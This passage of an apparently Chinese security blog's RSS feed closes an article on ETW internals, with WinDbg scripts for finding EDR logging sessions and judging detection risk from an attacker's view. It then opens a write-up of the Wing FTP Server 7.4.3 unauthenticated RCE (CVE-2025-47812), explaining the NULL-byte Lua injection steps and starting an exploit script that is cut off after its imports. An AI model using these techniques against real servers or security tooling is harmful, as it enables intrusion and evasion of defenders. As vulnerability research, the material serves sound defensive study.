&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;EtwConsumersForProcess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handles&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Io&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Handles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handle&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;handles&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ObjectType&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;EtwConsumer&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;consumer&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createTypedObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;nt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;_ETW_REALTIME_CONSUMER&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;c1&#34;&gt;// 处理消费者信息...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;更高效的方法是通过&lt;code&gt;EtwSiloState-&amp;gt;EtwpLoggerContext&lt;/code&gt;直接枚举日志会话及其消费者。&lt;/p&gt;
&lt;h2 id=&#34;查找提供者guid&#34;&gt;查找提供者GUID
&lt;/h2&gt;&lt;p&gt;通过分析&lt;code&gt;ETW_SILODRIVERSTATE&lt;/code&gt;结构的&lt;code&gt;EtwpGuidHashTable&lt;/code&gt;字段，我们可以：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;遍历64个哈希桶中的GUID条目&lt;/li&gt;
&lt;li&gt;检查每个&lt;code&gt;ETW_GUID_ENTRY&lt;/code&gt;的&lt;code&gt;EnableInfo&lt;/code&gt;数组&lt;/li&gt;
&lt;li&gt;匹配目标&lt;code&gt;LoggerId&lt;/code&gt;并提取关联进程信息&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GetGuidsForLoggerId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;loggerId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;guidType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;guidHashTable&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;typedhostSiloGlobals&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;EtwSiloState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;EtwpGuidHashTable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bucket&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;guidHashTable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;guidEntries&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Debugger&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Utility&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Collections&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;FromListEntry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(...);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 处理GUID条目...
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;实际应用价值&#34;&gt;实际应用价值
&lt;/h2&gt;&lt;p&gt;这些技术可帮助：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;识别EDR软件使用的ETW日志会话&lt;/li&gt;
&lt;li&gt;发现被禁用的日志会话（安全产品可能因此&amp;quot;失明&amp;quot;）&lt;/li&gt;
&lt;li&gt;从攻击者角度评估哪些ETW提供者可能带来检测风险&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所有JavaScript函数可在&lt;a class=&#34;link&#34; href=&#34;https://github.com/example/etw-scripts&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub仓库&lt;/a&gt;获取。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ETW是极其强大的机制，深入了解其内部工作原理对攻击者和防御者都大有裨益。本文仅触及表面，该领域还有更多值得探索的空间。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Wing FTP Server 7.4.3 - 未授权远程代码执行漏洞分析与利用</title>
        <link>http://localhost:1313/p/wing-ftp-server-7.4.3-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
        <pubDate>Mon, 04 Aug 2025 15:58:45 +0800</pubDate>
        
        <guid>http://localhost:1313/p/wing-ftp-server-7.4.3-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
        <description>&lt;h1 id=&#34;漏洞标题-wing-ftp-server-743---未授权远程代码执行rce&#34;&gt;漏洞标题: Wing FTP Server 7.4.3 - 未授权远程代码执行(RCE)
&lt;/h1&gt;&lt;h1 id=&#34;cve-cve-2025-47812&#34;&gt;CVE: CVE-2025-47812
&lt;/h1&gt;&lt;h1 id=&#34;日期-2025-06-30&#34;&gt;日期: 2025-06-30
&lt;/h1&gt;&lt;h1 id=&#34;漏洞作者-sheikh-mohammad-hasan-aka-4m3rr0r-&#34;&gt;漏洞作者: Sheikh Mohammad Hasan aka 4m3rr0r (&lt;a class=&#34;link&#34; href=&#34;https://github.com/4m3rr0r&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/4m3rr0r&lt;/a&gt;)
&lt;/h1&gt;&lt;h1 id=&#34;厂商主页&#34;&gt;厂商主页: &lt;a class=&#34;link&#34; href=&#34;https://www.wftpserver.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.wftpserver.com/&lt;/a&gt;
&lt;/h1&gt;&lt;h1 id=&#34;受影响版本-wing-ftp-server--743&#34;&gt;受影响版本: Wing FTP Server &amp;lt;= 7.4.3
&lt;/h1&gt;&lt;h1 id=&#34;测试环境-linuxroot权限-windowssystem权限&#34;&gt;测试环境: Linux(Root权限), Windows(SYSTEM权限)
&lt;/h1&gt;&lt;h1 id=&#34;漏洞描述&#34;&gt;漏洞描述:
&lt;/h1&gt;&lt;p&gt;Wing FTP Server 7.4.4之前版本存在未授权远程代码执行漏洞(CVE-2025-47812)。该漏洞源于登录过程中对&amp;rsquo;username&amp;rsquo;参数中的NULL字节处理不当，导致Lua代码被注入到会话文件中。当访问认证功能(如/dir.html)时，这些恶意构造的会话文件会被执行，从而在服务器上以高权限(root/Linux或SYSTEM/Windows)执行任意命令。漏洞利用了c_CheckUser()函数(在NULL处截断)和会话创建逻辑(使用未过滤完整用户名)之间的处理差异。&lt;/p&gt;
&lt;h1 id=&#34;漏洞验证python&#34;&gt;漏洞验证(Python):
&lt;/h1&gt;&lt;p&gt;提供的Python脚本自动化了漏洞利用过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;向loginok.html发送POST请求，在用户名中注入NULL字节和Lua代码&lt;/li&gt;
&lt;li&gt;成功认证(即使是匿名)后返回UID cookie&lt;/li&gt;
&lt;li&gt;使用该UID cookie访问dir.html触发注入的Lua代码执行&lt;/li&gt;
&lt;li&gt;最终实现远程代码执行&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;130
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;131
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;132
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;133
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;134
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;135
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;136
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;137
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;138
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;139
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;140
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;141
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;142
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;143
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;144
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;145
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;146
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;147
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;148
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;149
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;150
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;151
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;152
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;153
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;re&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;argparse&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ANSI颜色代码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;RED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\033&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[91m&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;GREEN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\033&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[92m&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;RESET&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\033&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[0m&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
